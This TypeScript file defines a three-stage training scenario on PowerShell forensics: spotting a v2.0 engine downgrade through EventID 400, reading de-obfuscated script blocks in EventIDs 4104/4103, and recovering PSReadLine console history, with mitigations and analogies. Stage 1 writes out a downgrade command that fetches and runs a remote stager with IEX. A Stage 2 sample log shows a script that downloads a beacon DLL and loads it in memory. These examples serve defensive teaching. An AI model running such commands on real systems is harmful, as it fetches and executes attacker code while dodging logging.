import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-powershell-eid4104-4103-clm-downgrade-forensics',
    title: 'Microsoft PowerShell Team, CISA & Mandiant DFIR — PowerShell EventID 4104 / 4103, Engine v2.0 Downgrade & PSReadLine History',
    category: 'MALWARE',
    mitreId: 'T1059.001',
    description:
      'Grounded in Microsoft PowerShell Team Logging Specifications, CISA PowerShell Security Guidance, and Mandiant DFIR research: an adversary attempts to bypass AMSI and Script Block Logging by launching powershell.exe -Version 2 (generating Windows PowerShell EventID 400 with EngineVersion=2.0 vs HostVersion=5.1), while post-exploitation commands on v5.1 hosts are captured in de-obfuscated form by EventID 4104 (ScriptBlockLogging), EventID 4103 (ModuleLogging), and %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Obfuscated PowerShell Stager', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'System.Management.Automation', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PowerShell Operational (4104)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'EID 400, 4103, 4104 & PSReadLine', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'ConsoleHost_history.txt', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: PowerShell v2.0 Engine Downgrade Detection (Windows PowerShell EventID 400 EngineVersion=2.0)',
        narration:
          'To evade AMSI and PowerShell v5 Script Block Logging, the attacker runs powershell.exe -Version 2 -NoP -Command "...". When the legacy .NET 2.0 CLR engine initializes, the classic "Windows PowerShell" event log records EventID 400 (Engine state is changed from None to Available) with HostVersion=5.1.19041.3570 juxtaposed against EngineVersion=2.0.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1562.001 - PowerShell v2.0 Downgrade Attack)',
        technicalCommands: [
          'powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.4.99/stager.ps1\')"',
          'LogName="Windows PowerShell" EventID=400: EngineVersion=2.0 | HostVersion=5.1.19041.3570',
        ],
        defenseMitigation:
          'Disable and remove the optional MicrosoftWindowsPowerShellV2 and MicrosoftWindowsPowerShellV2Root features via Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root.',
        logs: [
          {
            id: 'dfir-ps-1',
            timestamp: '10:05:14.112',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 400,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -Version 2 -NoProfile -Command "IEX ..."',
            raw: 'LogName: Windows PowerShell | EventID: 400 | EngineState: Available | EngineVersion: 2.0 | HostName: ConsoleHost | HostVersion: 5.1.19041.3570 | HostApplication: powershell.exe -Version 2 -NoProfile',
            parsedFields: {
              LogChannel: 'Windows PowerShell',
              EventID: '400 (Engine Lifecycle)',
              HostVersion: '5.1.19041.3570',
              EngineVersion: '2.0 (Downgrade Attack Detected)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Dynamic De-Obfuscation in Script Block Logging (EventID 4104) & Pipeline Binding (EventID 4103)',
        narration:
          'When v2 is disabled and the attacker runs a multi-layer Base64/XOR Invoke-Expression payload on PowerShell 5.1, every dynamic IEX evaluation passes a newly unpacked script block to System.Management.Automation, which logs the fully de-obfuscated plaintext code under Microsoft-Windows-PowerShell/Operational EventID 4104 (MessageNumber 1 of N, Level=Warning for suspicious APIs) and logs resolved parameter bindings under EventID 4103.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1059.001 - PowerShell EventID 4104 Dynamic De-Obfuscation)',
        technicalCommands: [
          'Microsoft-Windows-PowerShell/Operational EventID 4104 (Execute a Remote Command / ScriptBlockText)',
          'Microsoft-Windows-PowerShell/Operational EventID 4103 (CommandInvocation / ParameterBinding)',
          'Automatic Warning Trigger: System.Reflection.Assembly::Load, VirtualAlloc, MiniDumpWriteDump',
        ],
        defenseMitigation:
          'Enable Turn on PowerShell Script Block Logging and Turn on Module Logging (*) via Group Policy, along with Protected Event Logging (CMS encryption) to prevent credential leakage in logs.',
        logs: [
          {
            id: 'dfir-ps-2',
            timestamp: '10:05:19.840',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4104,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
            raw: 'LogName: Microsoft-Windows-PowerShell/Operational | EventID: 4104 | Level: Warning | MessageNumber: 1 | MessageTotal: 1 | ScriptBlockId: 8f19c2a0-4412-4b99-9120-aabbccddeeff | ScriptBlockText: $bytes = (New-Object Net.WebClient).DownloadData("https://198.51.100.20/beacon.dll"); [System.Reflection.Assembly]::Load($bytes)',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-PowerShell/Operational',
              EventID: '4104 (Script Block Logging) / 4103 (Module Pipeline)',
              ScriptBlockId: '8f19c2a0-4412-4b99-9120-aabbccddeeff',
              DeobfuscatedScript: '[System.Reflection.Assembly]::Load($bytes)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Persistent Interactive Command Recovery from PSReadLine ConsoleHost_history.txt',
        narration:
          'During interactive keyboard or pasted console sessions, the PowerShell PSReadLine module appends up to 4,096 commands directly to %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt on disk—even when InPrivate or Clear-History is invoked—preserving plaintext credentials and lateral movement commands for DFIR triage.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Collection (T1059.001 - PSReadLine ConsoleHost_history.txt Disk Artifact)',
        technicalCommands: [
          'Artifact Path: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
          'Get-Content C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
        ],
        defenseMitigation:
          'Include %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt across all user profiles in every Windows DFIR triage collection profile (such as KAPE PowerShell targets).',
        logs: [
          {
            id: 'dfir-ps-3',
            timestamp: '10:06:02.110',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'powershell.exe',
            CommandLine: 'PSReadLine writing interactive session history to ConsoleHost_history.txt',
            raw: 'Artifact: C:\\Users\\admin_ops\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | RecoveredLines: "$pass = ConvertTo-SecureString \'Winter2026!\' -AsPlainText -Force; Invoke-Command -ComputerName CORP-DC01 -ScriptBlock { whoami }"',
            parsedFields: {
              ArtifactFile: '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
              ModuleOrigin: 'PSReadLine (Default in Windows PowerShell 5.1 & PowerShell 7)',
              EvidentiaryValue: 'Survives Clear-History cmdlet and session termination',
            },
          },
        ],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a burglar trying to sneak commands past a modern voice-recording command booth in two ways: first, trying to wheel in an antique 2009 typewriter that lacks modern safety locks, and second, speaking in twisted coded riddles so hallway guards cannot understand the words. Investigators catch both tricks cleanly because the room logs the antique typewriter startup, the modern booth automatically transcribes every coded riddle right after it unwraps itself in memory, and the booth keyboard scratchpad quietly saves a permanent plain-text history of every interactive line typed.',
      storyMappings: [
        {
          storyTerm: 'Wheeling in an antique 2009 typewriter lacking modern safety locks',
          technicalTerm: 'PowerShell v2.0 downgrade (powershell.exe -Version 2) caught by EventID 400 (EngineVersion=2.0)',
          tone: 'amber',
        },
        {
          storyTerm: 'Booth automatically transcribing coded riddles after they unwrap in memory',
          technicalTerm: 'PowerShell Script Block Logging (EventID 4104) and Module Logging (EventID 4103)',
          tone: 'sky',
        },
        {
          storyTerm: 'Keyboard scratchpad saving permanent plain-text interactive history',
          technicalTerm: 'PSReadLine ConsoleHost_history.txt persisting typed interactive attacker commands on disk',
          tone: 'rose',
        },
        {
          storyTerm: 'Closing the antique typewriter loophole',
          technicalTerm: 'Removing the legacy PowerShell v2.0 engine feature and enforcing Constrained Language Mode',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Attempting to sidestep modern script-block cameras and Constrained Language guardrails, the intruder invokes an older legacy edition of the scripting booth, immediately tripping the engine-version bell that flags version 2.0 startup.',
        storyMappings: [
          {
            storyTerm: 'Invoking an older legacy edition of the scripting booth',
            technicalTerm: 'Launching powershell.exe -Version 2 to bypass AMSI, CLM, and Script Block Logging',
            tone: 'amber',
          },
          {
            storyTerm: 'Engine-version bell catching the downgrade',
            technicalTerm: 'Windows PowerShell EventID 400 recording EngineVersion=2.0 vs HostVersion=5.1',
            tone: 'sky',
          },
          {
            storyTerm: 'Why attackers try the downgrade',
            technicalTerm: 'PowerShell v2.0 predates EventID 4104 logging and AMSI security scanning',
            tone: 'rose',
          },
          {
            storyTerm: 'Permanent architectural cure',
            technicalTerm: 'Disabling Windows Optional Feature MicrosoftWindowsPowerShellV2Root',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'On modern patched booths where downgrade fails, even if the intruder wraps their payload inside multiple layers of Base64 and character-scrambling obfuscation, the PowerShell engine records the fully unwrapped plaintext script automatically the instant it compiles to run.',
        storyMappings: [
          {
            storyTerm: 'Multiple layers of character-scrambling obfuscation',
            technicalTerm: 'EncodedCommand, IEX, and XOR/gzip obfuscation attempting to evade CLI rules',
            tone: 'amber',
          },
          {
            storyTerm: 'Recording the fully unwrapped plaintext script automatically',
            technicalTerm: 'PowerShell Operational EventID 4104 (Script Block Logging) capturing deobfuscated code',
            tone: 'sky',
          },
          {
            storyTerm: 'Recording every pipeline parameter passed along the way',
            technicalTerm: 'PowerShell Operational EventID 4103 (Module / Pipeline Execution Logging)',
            tone: 'rose',
          },
          {
            storyTerm: 'Automatic security elevation for risky keywords',
            technicalTerm: 'Built-in suspicious-block auto-logging firing EventID 4104 Warning level even by default',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'Even after event logs rotate or the intruder clears visible console windows, investigators inspect the built-in keyboard history notebook saved automatically inside the user profile to recover every interactive reconnaissance and lateral command typed verbatim.',
        storyMappings: [
          {
            storyTerm: 'Built-in keyboard history notebook inside the user profile',
            technicalTerm: '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
            tone: 'amber',
          },
          {
            storyTerm: 'Surviving cleared windows and rotated event logs',
            technicalTerm: 'Plaintext persistent disk history written automatically by the PSReadLine module',
            tone: 'sky',
          },
          {
            storyTerm: 'Verbatim attacker reconnaissance and credential commands',
            technicalTerm: 'Interactive PowerShell lines typed across separate sessions preserved chronologically',
            tone: 'rose',
          },
          {
            storyTerm: 'Triaging across all compromised user profiles',
            technicalTerm: 'Sweeping C:\\Users\\*\\AppData\\Roaming\\...\\ConsoleHost_history.txt during DFIR',
            tone: 'emerald',
          },
        ],
      },
    },
  };
